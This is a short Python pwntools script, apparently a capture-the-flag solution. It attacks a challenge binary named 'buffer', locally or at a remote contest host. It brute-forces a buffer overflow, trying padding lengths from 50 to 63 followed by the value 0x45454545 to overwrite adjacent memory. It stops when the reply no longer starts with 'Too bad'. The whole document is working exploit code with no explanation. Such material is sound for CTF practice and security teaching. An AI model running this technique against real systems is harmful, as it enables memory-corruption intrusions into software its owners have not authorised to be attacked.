from pwn import *

EXE = ELF("./challenge/buffer")

def conn(useEXE=True):
    if useEXE:
        r = process([EXE.path])
    else:
        r = remote("chall.pwnoh.io", 13372)
    return r

context.binary = EXE
context.log_level = "DEBUG"

for offset in range(50, 64):
    io = conn(False)

    io.recvuntil("favorite number: ")
    io.sendline(b'a'*offset+p32(0x45454545))
    data =io.recvline()
    if(not data.startswith(b"Too bad")):
        print(data)
        break

    io.close()